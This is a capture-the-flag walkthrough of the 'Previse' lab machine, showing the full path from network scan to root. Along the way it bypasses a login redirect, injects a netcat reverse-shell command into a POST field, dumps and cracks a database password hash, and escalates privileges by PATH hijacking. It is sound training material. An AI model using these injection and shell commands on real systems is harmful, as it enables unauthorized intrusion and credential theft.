# PREVISE

### User Flag

```bash
[kali@kali ~]$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.104                                                                     
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Now we proceed to fuzz the webpage:

```bash
[kali@kali ~]$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.104:80/FUZZ -recursion -e .php -v -t 200
```

Many directories and files appear, but most of them return code 302. In other words, we need to log in so we can see them. However, we can bypass that by faking the response from the server and replacing the 302 status with a 200. We will do so by using burp. First, we configure our browser and set the proxy to 127.0.0.1 and port 8080 (so the traffic is redirected into burp). Then, we go into `Proxy` and click `Intercept is off` to intercept the traffic. In the browser, we go to http://10.10.11.104/accounts.php. When the `GET` request has been intercepted in burp, we have to click on `Action->Do intercept->Response to this request`. Then we click `Forward`, and now we can see the 302 response from the server. Now we need to fake it and replace `302 Found` by `200 OK` and click `Forward`. Now, in  the browser, we create a new account.

After we have logged into the webpage, we can go to http://10.10.11.104/files.php, where we will download a zip that contains a backup of the webpage. In the backup, we can read the php code that runs the page. We find an interesting file, `config.php` that seems to contain the user and password of the MySQL database. Since the MySQL port cannot be accessed from the outside (it did not appear in the nmap scan), this is useless at the moment. However, searching in the `logs.php` file, we find a possible vector attack:

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

Using the POST argument we can execute arbitrary code. We can exploit this vulnerability by creating a reverse shell. We listen in a given port with `nc`:

```bash
[kali@kali ~]$ nc -lnvvvp 4444
```

Then, we connect to the page (http://10.10.11.104/file_logs.php), intercept the traffic using burp, and click on the `SUBMIT` button. We intercept the POST message and append a netcat command to create a reverse shell:

```
delim=comma;nc our_vpn_ip 4444 -e /bin/bash
```

When we get the connection in our netcat, we can run the shell inside a python to get a better interface:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@previse:/var/www/html$
www-data@previse:/var/www/html$ cat /etc/passwd
```

Now that we are logged in with the `www-data` user, we can see that there is a user called `m4lwhere`. We can try to connect to the MySQL database using the previously discovered password:

```bash
www-data@previse:/var/www/html$ mysql -u root -p
mysql -u root -p
Enter password:
```

Inside the database we find a interesting table:

```sql
mysql> show databases;
...
use previse;
select * from accounts;
+----+---------------+------------------------------------+---------------------+
| id | username      | password                           | created_at          |
+----+---------------+------------------------------------+---------------------+
|  1 | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+----+---------------+------------------------------------+--------------------
```

We assume that the `m4lwhere` user has the same password in the database as in the Linux user. Therefore, we proceed to crack the password via hashcat. We just store the password (containing the password and the salt) into a .txt file and use the rockyou wordlist to crack it. We use `-m 500` flag to use hashcat format 500 (see the [hashcat webpage](https://hashcat.net/wiki/doku.php?id=example_hashes) to see all the available formats).

```bash
[kali@kali ~]$ hashcat -m 500 hash.txt rockyou.txt
```

After we crack the password, we connect via ssh and get the user flag.

### Root flag

After some enumeration, we'll find that in /opt/scripts there is a promising file called `access_backup.sh`:

```bash
m4lwhere@previse:~$ ls -l /opt/scripts/access_backup.sh
-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

...

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

We can check that the user `m4lwhere` is able to run the script with sudo, so we can exploit this file and use PATH manipulation to do privilege escalation:

```bash
m4lwhere@previse:~$ mkdir test/ && cd test/
m4lwhere@previse:~/test$ nano gzip
/bin/cat /root/root.txt > /home/m4lwhere/root.txt
m4lwhere@previse:~/test$ cp gzip date
```

so the root user outputs the root flag to a file that can be read by our current user. Then, we run the script and set the PATH variable to the path where we stored the malicious scripts:

```bash
m4lwhere@previse:~/test$ PATH=/home/m4lwhere/test/ /usr/bin/sudo /opt/scripts/access_backup.sh
m4lwhere@previse:~/test$ cat /home/m4lwhere/root.txt
```
